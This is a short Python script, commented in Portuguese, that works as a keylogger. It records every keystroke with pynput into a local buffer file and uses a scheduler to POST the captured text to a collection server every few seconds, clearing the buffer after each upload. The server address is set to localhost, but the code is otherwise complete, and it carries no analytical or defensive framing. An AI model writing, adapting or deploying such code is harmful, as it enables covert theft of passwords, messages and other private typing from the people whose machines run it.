from pynput.keyboard import Listener
import schedule
import time
import requests

LOG_FILE = 'buffer.txt'
SERVER_URL = 'http://localhost:8080/keyboard'


def on_press(key):
    try:
        with open(LOG_FILE, 'a') as file:
            file.write(f'{key.char}')

    except Exception as error:
        with open(LOG_FILE, 'a') as file:
            file.write(f' {key} \n')

def send_logs():
    print('>>>>>>')

    try:
        with open(LOG_FILE, 'r') as file:
            data = file.read()
        
        if data.strip(): 
            requests.post(SERVER_URL, json={'content': data})

            with open(LOG_FILE, "w") as file:
                file.write("")
                
    except Exception as e:
        ...

schedule.every(5).seconds.do(send_logs)

# Agendar envio a cada 10 segundos
schedule.every(10).seconds.do(send_logs)

# Executar o listener e o scheduler em paralelo
with Listener(on_press=on_press) as listener:
    while True:
        schedule.run_pending()  # Roda as tarefas agendadas
        time.sleep(1)  # Evita uso excessivo da CPU